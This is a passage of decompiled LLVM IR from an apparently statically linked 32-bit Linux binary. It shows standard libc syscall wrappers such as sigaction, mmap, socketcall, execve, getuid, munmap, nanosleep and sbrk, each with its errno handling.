  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32 0), label %dec_label_pc_8055740, label %dec_label_pc_805574c

dec_label_pc_8055740:                             ; preds = %dec_label_pc_8055728, %dec_label_pc_8055740
  %v4_805574044 = phi i32 [ %v1_8055747, %dec_label_pc_8055740 ], [ 0, %dec_label_pc_8055728 ]
  store i32 ptrtoint (i32* @global_var_8055747.568 to i32), i32* %stack_var_-168, align 4
  %v5_8055740 = mul i32 %v4_805574044, 4
  %v6_8055740 = add i32 %v5_8055740, ptrtoint (i32* @global_var_805e000.558 to i32)
  %v7_8055740 = inttoptr i32 %v6_8055740 to i32*
  %v8_8055740 = load i32, i32* %v7_8055740, align 4
  call void @__pseudo_call(i32 %v8_8055740)
  %v0_8055747 = load i32, i32* @ebx, align 4
  %v1_8055747 = add i32 %v0_8055747, 1
  store i32 %v1_8055747, i32* @ebx, align 4
  %v1_8055748.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8055748 = icmp ult i32 %v1_8055747, %v1_8055748.pre
  br i1 %v7_8055748, label %dec_label_pc_8055740, label %dec_label_pc_805574c

dec_label_pc_805574c:                             ; preds = %dec_label_pc_8055740, %dec_label_pc_8055728
  %v0_8055755 = load i32, i32* %stack_var_-168, align 4
  %v1_8055755 = call i32 @__errno_location(i32 %v0_8055755)
  %v1_805575a = inttoptr i32 %v1_8055755 to i32*
  store i32 0, i32* %v1_805575a, align 4
  %v0_8055769 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055769, i32* @eax, align 4
  %v1_805576e = inttoptr i32 %v0_8055769 to i32*
  store i32 0, i32* %v1_805576e, align 4
  call void @__pseudo_call(i32 %v0_80555d9)
  %v0_805578a = load i32, i32* @eax, align 4
  %v1_805578d = call i32 @__GI_exit(i32 %v0_805578a)
  %v0_8055799 = load i32, i32* @ebx, align 4
  %v1_8055799 = inttoptr i32 %v0_8055799 to %sigcontext*
  %v2_8055799 = call i32 @sigreturn(%sigcontext* %v1_8055799)
  %v0_80557a1 = load i32, i32* @ebx, align 4
  %v1_80557a1 = inttoptr i32 %v0_80557a1 to %sigcontext*
  %v2_80557a1 = call i32 @sigreturn(%sigcontext* %v1_80557a1)
  ret i32 %v2_80557a1

; uselistorder directives
  uselistorder i32 %v1_8055747, { 1, 2, 0 }
  uselistorder i32 %v1_8055723, { 1, 2, 0 }
  uselistorder i32 %v2_8055661, { 1, 0 }
  uselistorder i32 %v1_805565e, { 2, 1, 0 }
  uselistorder i32 %v1_805563d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805563a, { 1, 0 }
  uselistorder i32 %v1_8055611, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 1, 2 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.558 to i32), i32 -134602752), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8055740, { 1, 0 }
  uselistorder label %dec_label_pc_805571c, { 1, 0 }
  uselistorder label %dec_label_pc_80556f7, { 1, 0 }
  uselistorder label %dec_label_pc_805565e, { 1, 0 }
  uselistorder label %dec_label_pc_8055646, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_80557a3 = load i32, i32* @esi, align 4
  %v0_80557a4 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80557b9 = icmp eq i32* %arg2, null
  br i1 %v1_80557b9, label %dec_label_pc_805580d, label %dec_label_pc_80557bd

dec_label_pc_80557bd:                             ; preds = %entry
  %v2_80557bd = load i32, i32* %arg2, align 4
  store i32 %v2_80557bd, i32* %stack_var_-148, align 4
  %v1_80557c6 = add i32 %tmp11, 4
  %v3_80557d8 = bitcast i32* %stack_var_-136 to i16*
  %v4_80557d8 = call i32 @memcpy(i16* %v3_80557d8, i32 %v1_80557c6, i32 128)
  br label %dec_label_pc_805580d

dec_label_pc_805580d:                             ; preds = %entry, %dec_label_pc_80557bd
  %v1_805580f = icmp eq i32 %arg3, 0
  br i1 %v1_805580f, label %dec_label_pc_8055817, label %dec_label_pc_8055813

dec_label_pc_8055813:                             ; preds = %dec_label_pc_805580d
  %v2_8055813 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8055817

dec_label_pc_8055817:                             ; preds = %dec_label_pc_805580d, %dec_label_pc_8055813
  %v0_8055826 = phi i32 [ 0, %dec_label_pc_805580d ], [ %v2_8055813, %dec_label_pc_8055813 ]
  br i1 %v1_80557b9, label %dec_label_pc_8055824, label %dec_label_pc_805581d

dec_label_pc_805581d:                             ; preds = %dec_label_pc_8055817
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8055824

dec_label_pc_8055824:                             ; preds = %dec_label_pc_8055817, %dec_label_pc_805581d
  %v0_8055827 = phi %sigaction* [ null, %dec_label_pc_8055817 ], [ %phitmp, %dec_label_pc_805581d ]
  %v5_805582f = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8055827, i32 %v0_8055826, i32 8)
  store i32 %v5_805582f, i32* %ebx.global-to-local, align 4
  br i1 %v1_805580f, label %dec_label_pc_8055872, label %dec_label_pc_805583d

dec_label_pc_805583d:                             ; preds = %dec_label_pc_8055824
  %v2_805583d = icmp slt i32 %v5_805582f, 0
  br i1 %v2_805583d, label %dec_label_pc_8055872, label %dec_label_pc_8055841

dec_label_pc_8055841:                             ; preds = %dec_label_pc_805583d
  %v3_8055841 = load i32, i32* %stack_var_-288, align 4
  %v2_8055845 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8055841, i32* %v2_8055845, align 4
  %v2_805584d = ptrtoint i32* %stack_var_-276 to i32
  %v1_8055852 = add i32 %arg3, 4
  %v3_8055856 = inttoptr i32 %v1_8055852 to i16*
  %v4_8055856 = call i32 @memcpy(i16* %v3_8055856, i32 %v2_805584d, i32 128)
  %v2_805585f = add i32 %arg3, 132
  %v3_805585f = inttoptr i32 %v2_805585f to i32*
  %v2_805586c = add i32 %arg3, 136
  %v3_805586c = inttoptr i32 %v2_805586c to i32*
  %v0_8055878.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055872

dec_label_pc_8055872:                             ; preds = %dec_label_pc_805583d, %dec_label_pc_8055824, %dec_label_pc_8055841
  %v0_8055878 = phi i32 [ %v5_805582f, %dec_label_pc_805583d ], [ %v5_805582f, %dec_label_pc_8055824 ], [ %v0_8055878.pre, %dec_label_pc_8055841 ]
  store i32 %v0_80557a4, i32* @ebx, align 4
  store i32 %v0_80557a3, i32* @esi, align 4
  ret i32 %v0_8055878

; uselistorder directives
  uselistorder i1 %v1_805580f, { 1, 0 }
  uselistorder i1 %v1_80557b9, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8055872, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055824, { 1, 0 }
  uselistorder label %dec_label_pc_8055817, { 1, 0 }
  uselistorder label %dec_label_pc_805580d, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8055883 = load i32, i32* @eax, align 4
  %v1_8055885 = sub i32 0, %v0_8055883
  %v1_8055887 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_805588c = inttoptr i32 %v1_8055887 to i32*
  store i32 %v1_8055885, i32* %v2_805588c, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8055898 = load i32, i32* @ebx, align 4
  %v2_805589f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805589f, i32* @ebx, align 4
  %v8_80558a3 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8055898, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_80558a3, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134568064)
  ret i32 %v8_80558a3

; uselistorder directives
  uselistorder i32 %v8_80558a3, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134568064, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80558b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80558b4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80558c7 = call i32 @int80_syscall(i32 102)
  store i32 %v1_80558c7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80558c7, -4095
  br i1 %tmp, label %dec_label_pc_80558e0, label %dec_label_pc_80558d4

dec_label_pc_80558d4:                             ; preds = %entry
  %v0_80558d4 = load i32, i32* %stack_var_-4, align 4
  %v1_80558d4 = call i32 @__errno_location(i32 %v0_80558d4)
  %v0_80558d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80558d9 = sub i32 0, %v0_80558d9
  %v2_80558db = inttoptr i32 %v1_80558d4 to i32*
  store i32 %v1_80558d9, i32* %v2_80558db, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80558e0

dec_label_pc_80558e0:                             ; preds = %entry, %dec_label_pc_80558d4
  %v0_80558e1 = phi i32 [ %v1_80558c7, %entry ], [ -1, %dec_label_pc_80558d4 ]
  %v2_80558e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80558e0, i32* @edx, align 4
  %v2_80558e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80558e4, i32* @ebx, align 4
  ret i32 %v0_80558e1

; uselistorder directives
  uselistorder i32 %v1_80558c7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80558e0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80558e9 = load i32, i32* @esi, align 4
  store i32 %v0_80558e9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80558fd = load i32, i32* @ebx, align 4
  %v7_8055905 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8055905, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8055905, -4095
  br i1 %tmp, label %dec_label_pc_805591d, label %dec_label_pc_8055911

dec_label_pc_8055911:                             ; preds = %entry
  %v1_8055911 = call i32 @__errno_location(i32 %v0_80558fd)
  %v0_8055916 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055916 = sub i32 0, %v0_8055916
  %v2_8055918 = inttoptr i32 %v1_8055911 to i32*
  store i32 %v1_8055916, i32* %v2_8055918, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805591d

dec_label_pc_805591d:                             ; preds = %entry, %dec_label_pc_8055911
  %v0_805591e = phi i32 [ %v7_8055905, %entry ], [ -1, %dec_label_pc_8055911 ]
  %v2_805591d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805591d, i32* @edx, align 4
  %v2_8055920 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055920, i32* @esi, align 4
  ret i32 %v0_805591e

; uselistorder directives
  uselistorder i32 %v7_8055905, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805591d, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055924 = load i32, i32* @ebx, align 4
  store i32 %v0_8055924, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8055937 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8055937, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8055937, -4095
  br i1 %tmp, label %dec_label_pc_8055950, label %dec_label_pc_8055944

dec_label_pc_8055944:                             ; preds = %entry
  %v0_8055944 = load i32, i32* %stack_var_-4, align 4
  %v1_8055944 = call i32 @__errno_location(i32 %v0_8055944)
  %v0_8055949 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055949 = sub i32 0, %v0_8055949
  %v2_805594b = inttoptr i32 %v1_8055944 to i32*
  store i32 %v1_8055949, i32* %v2_805594b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055950

dec_label_pc_8055950:                             ; preds = %entry, %dec_label_pc_8055944
  %v0_8055951 = phi i32 [ %v4_8055937, %entry ], [ -1, %dec_label_pc_8055944 ]
  %v2_8055950 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055950, i32* @edx, align 4
  %v2_8055954 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055954, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055951

; uselistorder directives
  uselistorder i32 %v4_8055937, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055950, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055958 = load i32, i32* @edi, align 4
  store i32 %v0_8055958, i32* %stack_var_-4, align 4
  %v4_805595c = ptrtoint i8* %arg1 to i32
  store i32 %v4_805595c, i32* %edi.global-to-local, align 4
  %v0_8055968 = load i32, i32* @ebx, align 4
  %v5_8055970 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8055970 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8055970 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8055970, [1 x i8*] %v8_8055970)
  store i32 %v9_8055970, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8055970, -4095
  br i1 %tmp12, label %dec_label_pc_8055988, label %dec_label_pc_805597c

dec_label_pc_805597c:                             ; preds = %entry
  %v1_805597c = call i32 @__errno_location(i32 %v0_8055968)
  %v0_8055981 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055981 = sub i32 0, %v0_8055981
  %v2_8055983 = inttoptr i32 %v1_805597c to i32*
  store i32 %v1_8055981, i32* %v2_8055983, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055988

dec_label_pc_8055988:                             ; preds = %entry, %dec_label_pc_805597c
  %v0_8055989 = phi i32 [ %v9_8055970, %entry ], [ -1, %dec_label_pc_805597c ]
  %v2_8055988 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055988, i32* @edx, align 4
  %v2_805598c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805598c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055989

; uselistorder directives
  uselistorder i32 %v9_8055970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055988, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055990 = load i32, i32* @ebx, align 4
  store i32 %v0_8055990, i32* %stack_var_-4, align 4
  %v1_8055999 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8055999, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055999, -4095
  br i1 %tmp, label %dec_label_pc_80559b0, label %dec_label_pc_80559a4

dec_label_pc_80559a4:                             ; preds = %entry
  %v0_80559a4 = load i32, i32* %stack_var_-4, align 4
  %v1_80559a4 = call i32 @__errno_location(i32 %v0_80559a4)
  %v0_80559a9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80559a9 = sub i32 0, %v0_80559a9
  %v2_80559ab = inttoptr i32 %v1_80559a4 to i32*
  store i32 %v1_80559a9, i32* %v2_80559ab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80559b0

dec_label_pc_80559b0:                             ; preds = %entry, %dec_label_pc_80559a4
  %v0_80559b1 = phi i32 [ %v1_8055999, %entry ], [ -1, %dec_label_pc_80559a4 ]
  %v2_80559b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80559b4, i32* @ebx, align 4
  ret i32 %v0_80559b1

; uselistorder directives
  uselistorder i32 %v1_8055999, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_80559b0, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80559b8 = load i32, i32* @ebx, align 4
  store i32 %v0_80559b8, i32* %stack_var_-4, align 4
  %v1_80559c1 = call i32 @int80_syscall(i32 200)
  store i32 %v1_80559c1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80559c1, -4095
  br i1 %tmp, label %dec_label_pc_80559d8, label %dec_label_pc_80559cc

dec_label_pc_80559cc:                             ; preds = %entry
  %v0_80559cc = load i32, i32* %stack_var_-4, align 4
  %v1_80559cc = call i32 @__errno_location(i32 %v0_80559cc)
  %v0_80559d1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80559d1 = sub i32 0, %v0_80559d1
  %v2_80559d3 = inttoptr i32 %v1_80559cc to i32*
  store i32 %v1_80559d1, i32* %v2_80559d3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80559d8

dec_label_pc_80559d8:                             ; preds = %entry, %dec_label_pc_80559cc
  %v0_80559d9 = phi i32 [ %v1_80559c1, %entry ], [ -1, %dec_label_pc_80559cc ]
  %v2_80559dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80559dc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80559d9

; uselistorder directives
  uselistorder i32 %v1_80559c1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80559d8, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_80559e0 = load i32, i32* @global_var_80646d0.564, align 16
  store i32 %v0_80559e0, i32* @edx, align 4
  %v1_80559eb = icmp eq i32 %v0_80559e0, 0
  %v1_80559ed = icmp eq i1 %v1_80559eb, false
  %v4_80559ed = select i1 %v1_80559ed, i32 %v0_80559e0, i32 4096
  ret i32 %v4_80559ed
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80559f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80559f4, i32* %stack_var_-4, align 4
  %v1_80559fd = call i32 @int80_syscall(i32 199)
  store i32 %v1_80559fd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80559fd, -4095
  br i1 %tmp, label %dec_label_pc_8055a14, label %dec_label_pc_8055a08

dec_label_pc_8055a08:                             ; preds = %entry
  %v0_8055a08 = load i32, i32* %stack_var_-4, align 4
  %v1_8055a08 = call i32 @__errno_location(i32 %v0_8055a08)
  %v0_8055a0d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055a0d = sub i32 0, %v0_8055a0d
  %v2_8055a0f = inttoptr i32 %v1_8055a08 to i32*
  store i32 %v1_8055a0d, i32* %v2_8055a0f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a14

dec_label_pc_8055a14:                             ; preds = %entry, %dec_label_pc_8055a08
  %v0_8055a15 = phi i32 [ %v1_80559fd, %entry ], [ -1, %dec_label_pc_8055a08 ]
  %v2_8055a18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055a18, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055a15

; uselistorder directives
  uselistorder i32 %v1_80559fd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_8055a14, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055a1c = load i32, i32* @ebx, align 4
  store i32 %v0_8055a1c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8055a2f = call i32 @munmap(i32 %v0_8055a1c, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8055a2f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8055a2f, -4095
  br i1 %tmp, label %dec_label_pc_8055a48, label %dec_label_pc_8055a3c

dec_label_pc_8055a3c:                             ; preds = %entry
  %v0_8055a3c = load i32, i32* %stack_var_-4, align 4
  %v1_8055a3c = call i32 @__errno_location(i32 %v0_8055a3c)
  %v0_8055a41 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055a41 = sub i32 0, %v0_8055a41
  %v2_8055a43 = inttoptr i32 %v1_8055a3c to i32*
  store i32 %v1_8055a41, i32* %v2_8055a43, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a48

dec_label_pc_8055a48:                             ; preds = %entry, %dec_label_pc_8055a3c
  %v0_8055a49 = phi i32 [ %v4_8055a2f, %entry ], [ -1, %dec_label_pc_8055a3c ]
  %v2_8055a48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055a48, i32* @edx, align 4
  %v2_8055a4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055a4c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055a49

; uselistorder directives
  uselistorder i32 %v4_8055a2f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055a48, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055a50 = load i32, i32* @ebx, align 4
  store i32 %v0_8055a50, i32* %stack_var_-4, align 4
  %v4_8055a54 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8055a54, i32* %ebx.global-to-local, align 4
  %v6_8055a63 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_8055a63, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8055a63, -4095
  br i1 %tmp, label %dec_label_pc_8055a7c, label %dec_label_pc_8055a70

dec_label_pc_8055a70:                             ; preds = %entry
  %v0_8055a70 = load i32, i32* %stack_var_-4, align 4
  %v1_8055a70 = call i32 @__errno_location(i32 %v0_8055a70)
  %v0_8055a75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055a75 = sub i32 0, %v0_8055a75
  %v2_8055a77 = inttoptr i32 %v1_8055a70 to i32*
  store i32 %v1_8055a75, i32* %v2_8055a77, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a7c

dec_label_pc_8055a7c:                             ; preds = %entry, %dec_label_pc_8055a70
  %v0_8055a7d = phi i32 [ %v6_8055a63, %entry ], [ -1, %dec_label_pc_8055a70 ]
  %v2_8055a7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055a7c, i32* @edx, align 4
  %v2_8055a80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055a80, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055a7d

; uselistorder directives
  uselistorder i32 %v6_8055a63, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055a7c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055a85 = load i32, i32* @ebx, align 4
  %v0_8055a89 = load i32, i32* @global_var_8064704.569, align 4
  %v1_8055a89 = icmp eq i32 %v0_8055a89, 0
  %v1_8055a94 = icmp eq i1 %v1_8055a89, false
  br i1 %v1_8055a94, label %dec_label_pc_8055aa7, label %dec_label_pc_8055a96

dec_label_pc_8055a96:                             ; preds = %entry
  %v1_8055a9b = call i32 @__GI_brk(i32 0)
  %v2_8055aa3 = icmp slt i32 %v1_8055a9b, 0
  br i1 %v2_8055aa3, label %dec_label_pc_8055ac9, label %dec_label_pc_8055a96.dec_label_pc_8055aa7_crit_edge

dec_label_pc_8055a96.dec_label_pc_8055aa7_crit_edge: ; preds = %dec_label_pc_8055a96
  %v0_8055aa9.pre = load i32, i32* @global_var_8064704.569, align 4
  br label %dec_label_pc_8055aa7

dec_label_pc_8055aa7:                             ; preds = %dec_label_pc_8055a96.dec_label_pc_8055aa7_crit_edge, %entry
  %v0_8055ab7 = phi i32 [ %v0_8055aa9.pre, %dec_label_pc_8055a96.dec_label_pc_8055aa7_crit_edge ], [ %v0_8055a89, %entry ]
  %v1_8055aa7 = icmp eq i32 %arg1, 0
  %v1_8055aae = icmp eq i1 %v1_8055aa7, false
  br i1 %v1_8055aae, label %dec_label_pc_8055ab4, label %dec_label_pc_8055ab0

dec_label_pc_8055ab0:                             ; preds = %dec_label_pc_8055aa7
  br label %dec_label_pc_8055acc

dec_label_pc_8055ab4:                             ; preds = %dec_label_pc_8055aa7
  store i32 %v0_8055ab7, i32* @ebx, align 4
  %v2_8055ab9 = add i32 %v0_8055ab7, %arg1
  %v1_8055abd = call i32 @__GI_brk(i32 %v2_8055ab9)
  %v2_8055ac5 = icmp slt i32 %v1_8055abd, 0
  %v1_8055ac7 = icmp eq i1 %v2_8055ac5, false
  br i1 %v1_8055ac7, label %dec_label_pc_8055ab4.dec_label_pc_8055acc_crit_edge, label %dec_label_pc_8055ac9

dec_label_pc_8055ab4.dec_label_pc_8055acc_crit_edge: ; preds = %dec_label_pc_8055ab4
  %v0_8055acd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055acc

dec_label_pc_8055ac9:                             ; preds = %dec_label_pc_8055ab4, %dec_label_pc_8055a96
  br label %dec_label_pc_8055acc

dec_label_pc_8055acc:                             ; preds = %dec_label_pc_8055ab4.dec_label_pc_8055acc_crit_edge, %dec_label_pc_8055ab0, %dec_label_pc_8055ac9
  %v0_8055acd = phi i32 [ %v0_8055acd.pre, %dec_label_pc_8055ab4.dec_label_pc_8055acc_crit_edge ], [ %v0_8055ab7, %dec_label_pc_8055ab0 ], [ -1, %dec_label_pc_8055ac9 ]
  %v2_8055acc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055acc, i32* @edx, align 4
  store i32 %v0_8055a85, i32* @ebx, align 4
  ret i32 %v0_8055acd

; uselistorder directives
  uselistorder i32 %v0_8055ab7, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8055acc, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
